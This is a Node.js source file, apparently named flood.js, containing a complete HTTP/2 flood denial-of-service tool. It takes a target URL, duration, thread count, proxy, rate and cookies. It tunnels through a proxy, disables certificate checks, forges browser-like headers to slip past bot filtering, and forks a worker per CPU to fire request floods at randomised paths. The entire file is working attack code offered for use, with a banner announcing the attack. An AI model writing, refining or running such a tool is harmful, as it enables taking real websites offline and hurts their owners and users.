const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const { HeaderGenerator } = require('header-generator');

// ========== KONFIGURASI ==========
const CONFIG = {
    MAX_CONCURRENT_STREAMS: 1000,
    INITIAL_WINDOW_SIZE: 6291456,
    SESSION_MEMORY: 64000,
    KEEP_ALIVE_TIMEOUT: 60000,
    REQUEST_TIMEOUT: 10000
};

// ========== VALIDASI PARAMETER ==========
if (process.argv.length < 9) {
    console.log(`
Usage: node flood.js <url> <duration> <threads> <proxy> <rate> <cookies> <userAgent>
Example: node flood.js https://example.com 60 10 192.168.1.1:8080 50 "session=abc123" "Mozilla/5.0..."
    `);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    duration: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4]),
    proxy: process.argv[5],
    rate: parseInt(process.argv[6]),
    cookies: process.argv[7],
    userAgent: process.argv[8]
};

const parsedTarget = url.parse(args.target);

// ========== HEADER GENERATOR ==========
const headerGenerator = new HeaderGenerator({
    browsers: [{ name: "chrome", minVersion: 100, httpVersion: "2" }],
    devices: ["desktop"],
    operatingSystems: ["windows"],
    locales: ["en-US", "en"]
});

// ========== UTILITY FUNCTIONS ==========
class FloodUtils {
    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    static generateRandomPath() {
        const paths = ['/', '/search', '/api/v1/data', '/products', '/users'];
        const randomPath = paths[this.randomInt(0, paths.length - 1)];
        return randomPath + '?q=' + crypto.randomBytes(8).toString('hex');
    }

    static createTLSCiphers() {
        return [
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_GCM_SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-AES256-GCM-SHA384'
        ].join(':');
    }
}

// ========== PROXY CONNECTION MANAGER ==========
class ProxyManager {
    static connectThroughProxy(proxy, target, timeout = 10000) {
        return new Promise((resolve, reject) => {
            const [proxyHost, proxyPort] = proxy.split(':');
            const [targetHost, targetPort = 443] = target.split(':');

            const connection = net.connect({
                host: proxyHost,
                port: parseInt(proxyPort)
            });

            connection.setTimeout(timeout);
            connection.setKeepAlive(true, CONFIG.KEEP_ALIVE_TIMEOUT);

            const payload = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nConnection: Keep-Alive\r\n\r\n`;

            connection.on("connect", () => {
                connection.write(payload);
            });

            connection.on("data", (chunk) => {
                const response = chunk.toString();
                if (response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200")) {
                    resolve(connection);
                } else {
                    connection.destroy();
                    reject(new Error("Invalid proxy response"));
                }
            });

            connection.on("timeout", () => {
                connection.destroy();
                reject(new Error("Proxy connection timeout"));
            });

            connection.on("error", (error) => {
                connection.destroy();
                reject(error);
            });
        });
    }
}

// ========== HTTP/2 ATTACK CLASS ==========
class HTTP2Flooder {
    constructor(target, proxy, userAgent, cookies) {
        this.target = target;
        this.proxy = proxy;
        this.userAgent = userAgent;
        this.cookies = cookies;
        this.isActive = true;
        this.requestCount = 0;
    }

    async initialize() {
        try {
            // Establish proxy connection
            const proxyConnection = await ProxyManager.connectThroughProxy(
                this.proxy, 
                parsedTarget.host
            );

            // Create TLS connection through proxy
            const tlsConnection = tls.connect({
                socket: proxyConnection,
                servername: parsedTarget.hostname,
                ALPNProtocols: ['h2'],
                ciphers: FloodUtils.createTLSCiphers(),
                rejectUnauthorized: false,
                secureContext: tls.createSecureContext()
            });

            // Create HTTP/2 client
            const client = http2.connect(this.target, {
                createConnection: () => tlsConnection,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: CONFIG.MAX_CONCURRENT_STREAMS,
                    initialWindowSize: CONFIG.INITIAL_WINDOW_SIZE,
                    maxHeaderListSize: 262144,
                    enablePush: false
                }
            });

            client.on('error', (error) => {
                console.error(`[HTTP2 Error] ${error.message}`);
                this.isActive = false;
            });

            client.on('close', () => {
                this.isActive = false;
            });

            return client;
        } catch (error) {
            console.error(`[Init Error] ${error.message}`);
            throw error;
        }
    }

    generateHeaders() {
        const randomHeaders = headerGenerator.getHeaders();
        
        return {
            ':method': 'GET',
            ':path': FloodUtils.generateRandomPath(),
            ':scheme': 'https',
            ':authority': parsedTarget.hostname,
            'accept': randomHeaders.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': randomHeaders['accept-language'] || 'en-US,en;q=0.9',
            'accept-encoding': randomHeaders['accept-encoding'] || 'gzip, deflate, br',
            'user-agent': this.userAgent,
            'cookie': this.cookies,
            'referer': `https://${parsedTarget.hostname}/`,
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'cache-control': 'no-cache',
            'pragma': 'no-cache'
        };
    }

    async startAttack(rate) {
        try {
            const client = await this.initialize();
            
            const attackInterval = setInterval(() => {
                if (!this.isActive) {
                    clearInterval(attackInterval);
                    return;
                }

                for (let i = 0; i < rate; i++) {
                    try {
                        const headers = this.generateHeaders();
                        const request = client.request(headers);

                        request.on('response', (headers) => {
                            this.requestCount++;
                            request.close();
                        });

                        request.on('error', () => {
                            request.close();
                        });

                        request.end();
                    } catch (error) {
                        // Silent fail for individual requests
                    }
                }
            }, 1000);

            // Cleanup
            setTimeout(() => {
                clearInterval(attackInterval);
                this.isActive = false;
                try { client.destroy(); } catch {}
            }, args.duration * 1000);

        } catch (error) {
            console.error(`[Attack Error] ${error.message}`);
        }
    }
}

// ========== CLUSTER MANAGEMENT ==========
if (cluster.isPrimary) {
    console.log(`
🚀 HTTP/2 FLOOD ATTACK STARTED
📍 Target: ${args.target}
⏰ Duration: ${args.duration}s
🧵 Threads: ${args.threads}
📊 Rate: ${args.rate}/s
🔌 Proxy: ${args.proxy}
    `);

    // Fork worker processes
    for (let i = 0; i < Math.min(args.threads, require('os').cpus().length); i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`[Worker ${worker.process.pid}] exited`);
    });

    // Global timeout
    setTimeout(() => {
        console.log('⏹️  Attack completed');
        process.exit(0);
    }, args.duration * 1000);

} else {
    // Worker process
    const flooder = new HTTP2Flooder(
        args.target,
        args.proxy, 
        args.userAgent,
        args.cookies
    );

    flooder.startAttack(Math.ceil(args.rate / args.threads)).catch(console.error);

    // Worker statistics
    setInterval(() => {
        if (flooder.requestCount > 0) {
            console.log(`[Worker ${process.pid}] Requests: ${flooder.requestCount}`);
        }
    }, 5000);
}

// ========== ERROR HANDLING ==========
process.on('uncaughtException', (error) => {
    console.error(`[Fatal Error] ${error.message}`);
});

process.on('unhandledRejection', (reason) => {
    console.error(`[Unhandled Rejection] ${reason}`);
});

// Increase limits
require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);